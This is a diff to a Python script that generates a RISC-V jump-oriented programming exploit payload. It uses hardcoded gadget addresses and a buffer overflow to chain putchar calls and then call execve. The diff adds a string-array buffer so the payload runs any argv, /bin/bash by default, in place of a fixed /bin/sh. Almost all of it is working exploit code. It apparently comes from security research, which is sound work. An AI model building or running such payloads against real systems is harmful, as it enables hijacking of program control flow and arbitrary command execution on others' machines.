@@ -1,4 +1,6 @@
 import argparse
+import ast
+import binascii
 
 # Abstract buffer class for printing/size
 class buffer:
@@ -13,6 +15,31 @@ class zeroBuf(buffer):
         if bytelen is not None:
             words = int(bytelen / 8)
         self.buf = [0 for i in range(words)]
+
+# Buffer with string array
+class stringArrayBuf(buffer):
+    def __init__(self, address, strings):
+        self.address = address
+        # Null terminate the array of string pointers
+        charptrarray_len = len(strings) + 1
+        # Setup pointers to the strings plus a null pointer
+        self.buf = [0 for i in range(charptrarray_len)]
+        for index, string in enumerate(strings):
+            # Store the pointer to where this string's data will start
+            self.buf[index] = address + (len(self.buf)*8)
+
+            # Null terminate the string
+            nullt = string + '\0'
+            # Add more null terminators until the string is 8-byte aligned
+            for i in range(len(nullt) % 8, 8):
+                nullt += '\0'
+            
+            # Store the hexademical values of the string in the buffer
+            for i in range(int(len(nullt) / 8)):
+                # Convert this 8-byte slice of a string to an integer - reverse the the byte order
+                hexstring = binascii.hexlify(bytes(nullt[i*8:(i+1)*8], 'ascii')[::-1])
+                hexvalue = int(hexstring, 16)
+                self.buf.append(hexvalue)
 
 # longjmp buffer containing registers to load
 class longjmpBuf(buffer):
@@ -116,9 +143,9 @@ mv_s3_to_t0_jalr_a3 = 0x200007be24
 mv_s0_to_a3_jalr_s9 = 0x200004b38c
 execve = 0x20000ad180
 putchar = 0x2000080bcc
-bin_sh_str = 0x20001178a8
 
 # Unused pointers
+bin_sh_str = 0x20001178a8
 mv_a0a1a2_jalr_a5 = 0x2000067010
 jalr_a5 = 0x200006701a
 
@@ -128,6 +155,7 @@ parser.add_argument('-o', '--out', type=str, help='output file name', default='d
 parser.add_argument('-m', '--msg', type=str, help='string to print out', default='RISC-V JOP Success')
 parser.add_argument('--buffer-size', type=int, help='size of buffer to overflow', default=10000)
 parser.add_argument('--buffer-address', type=lambda x: int(x,0), help='size of buffer to overflow', default=0x2aaaaad480)
+parser.add_argument('-e','--execve', type=ast.literal_eval, default=["/bin/bash"])
 args = parser.parse_args()
 
 dispatch_file = open(args.out, 'w')
@@ -149,10 +177,18 @@ bufs = [buf1, buf2]
 # Add more dispatch buffers to chain calls to putchar
 print_string(args.msg + '\n', bufs)
 
-# Final buffer jumps to execve and executes "/bin/sh"
-final_buf = dispatchBuf(bufs[-1])
-final_buf.set_a0(bin_sh_str)
-final_buf.set_a1(0)
+# Add a buffer with the array of strings following the putchars
+execve_strbuf = stringArrayBuf(bufs[-1].next_dispatch_buf, args.execve)
+# Have the last putchar jump past this string buffer
+bufs[-1].set_s3(execve_strbuf.address + execve_strbuf.size() - 176)
+bufs.append(execve_strbuf)
+
+# Final buffer jumps to execve. It starts after the string array buffer
+final_buf = dispatchBuf(execve_strbuf.address + execve_strbuf.size())
+# Set the first argument to the first strihng in the string buf - the executable to run
+final_buf.set_a0(execve_strbuf.buf[0])
+# Pass the entire char*[] to the second argument
+final_buf.set_a1(execve_strbuf.address)
 final_buf.set_a2(0)
 final_buf.set_t1(execve)
 bufs.append(final_buf)
